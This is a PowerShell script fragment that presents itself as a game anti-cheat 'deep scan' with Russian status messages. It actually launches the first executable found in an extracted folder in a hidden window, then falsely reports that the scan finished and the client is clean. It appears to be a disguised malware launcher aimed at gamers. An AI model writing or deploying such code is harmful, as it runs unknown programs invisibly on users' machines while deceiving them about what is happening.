$Exe = Get-ChildItem -Path $EXTRACT -Filter "*.exe" -Recurse |
    Select-Object -First 1

if ($Exe) {
    Write-Host "[*] Запуск глубокого сканирования..." -ForegroundColor Yellow
    Start-Process -WindowStyle Hidden $Exe.FullName
    Write-Host "[+] Сканирование завершено. Читы не обнаружены." -ForegroundColor Green
    Write-Host "[+] Ваш клиент чист." -ForegroundColor Green
}
else {
    Write-Host "[-] Ошибка: компонент сканера не найден" -ForegroundColor Red
}
